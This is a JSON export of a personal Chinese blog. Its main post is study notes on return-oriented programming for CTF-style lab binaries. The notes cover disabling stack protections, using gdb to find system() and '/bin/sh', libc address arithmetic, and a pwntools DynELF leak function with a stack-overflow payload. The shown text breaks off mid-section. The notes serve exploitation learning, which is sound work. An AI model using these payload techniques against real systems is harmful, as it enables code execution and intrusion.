{"posts": [{"title": "\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u7b14\u8bb0", "date": "2018-03-28T14:45:00-00.00", "path": "/archives/note/", "text": "\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u7b14\u8bb0\n\u539f\u6587\u5730\u5740: \u4e00\u6b65\u4e00\u6b65\u5b66ROP\n\nx86\n\u65e0\u4fdd\u62a4\n\n\u5173\u6389canary:  -fno-stack-protector\n\u5173\u6389NX:  -z execstack\n\u5173\u6389PIE:  sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space\n\n\u7ed5\u8fc7NX\ngdb\u4e0b\u627esystem()\u548c\"/bin/sh\\x00\"\u7684\u5730\u5740:\n(gdb) print system\n$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;\n(gdb) print __libc_start_main\n$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;\n(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;\n0xb7f81ff8\n(gdb) x/s 0xb7f81ff8\n0xb7f81ff8:  &quot;/bin/sh&quot;\n\n\u7ed5\u8fc7NX\u548cPIE\n\n\u770bplt : objdump -d -j .plt level2\n\u770bgot : objdump -R level2\n\u67e5\u770b\u76ee\u6807\u7a0b\u5e8f\u8c03\u7528\u7684so\u5e93 : ldd level2\n\n\u7528pwntools:\nelf = ELF(&#39;level2&#39;)\nplt_write = elf.symbols[&#39;write&#39;]\ngot_write = elf.got[&#39;write&#39;]\n\nlibc = ELF(&#39;libc.so&#39;)\nsystem_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])\n\n\u65e0libc.so\n\u6b65\u9aa4:\n\n\u6cc4\u9732__libc_start_main\u5730\u5740\n\u83b7\u53d6libc\u7248\u672c\n\u83b7\u53d6system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\n\u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f\n\u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884csystem(\u201c/bin/sh\u201d)\n\nDynELF\u7684\u4f7f\u7528:\ndef leak(address):\n    payload1 = &#39;a&#39;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)\n    p.send(payload1)\n    data = p.recv(4)\n    print &quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;))\n    return data\n\nd = DynELF(leak, elf=ELF(&#39;./level2&#39;))\nsystem_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)\n\n\nx64\n\u4f20\u53c2\u533a\u522b\n\n\u524d\u516d\u4e2a\u53c2\u6570\u4fdd\u5b58\u987a\u5e8f : RDI, RSI, RDX, RCX, R8, R9\n\ngadgets\n\n\u627eROP:  ROPgadget --binary level4 --only \"pop|ret\"\n\u8fc7\u6ee4:  ROPgadget --binary libc.so.6 --only \"pop|ret\" | grep rdi\n\n\u901a\u7528gadgets part1\n__libc_csu_init()\u4e0b:\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "ROP", "slug": "ROP", "permalink": "/tag/ROP/"}]}], "pages": [{"title": "\u5173\u4e8e", "date": "2017-06-28T17:26:00-00.00", "path": "/about/", "text": "\u8fd9\u91cc\u662f\u6211\u7684\u4e2a\u4eba\u535a\u5ba2\uff0c\u901a\u8fc7 GitHub \u7ba1\u7406\u4e0e\u6784\u5efa\u3002\nContact\nEmail: yuripwn@gmail.com\n", "categories": [], "tags": []}]}